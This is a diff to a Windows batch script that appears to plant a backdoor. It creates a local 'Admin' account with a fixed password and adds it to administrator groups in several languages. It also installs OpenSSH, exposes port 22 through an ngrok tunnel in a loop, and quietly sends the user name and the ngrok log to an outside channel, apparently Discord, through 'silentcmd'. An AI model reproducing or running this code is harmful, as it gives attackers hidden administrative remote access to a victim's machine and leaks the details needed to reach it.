@@ -10,7 +10,7 @@ powershell ./OpenSSH.ps1
 net user "Admin" "Administrator" /add
 net localgroup Administrators Admin /add
 net localgroup Administratorzy Admin /add
-net localgroup Administración  Admin /add
+net localgroup Administración Admin /add
 
 set ""
 
@@ -23,6 +23,9 @@ whoami>user.txt
 call Source.bat +silent --file %temp%/user.txt
 
 tar -xf ngrok.zip
-start /B silentcmd Source.bat +silent --file %temp%/ngrok.log /DELAY:10
-call ngrok.exe tcp 22 -log=stdout > ngrok.log
+
+:ngrokloop
+start /B "discordmsg" silentcmd Source.bat +silent --file %temp%/ngrok.log /DELAY:10 && timeout 15 & taskkill /IM ngrok.exe /F
+start /B "ngrok" call ngrok.exe tcp 22 -log=stdout > ngrok.log
+goto ngrokloop
 
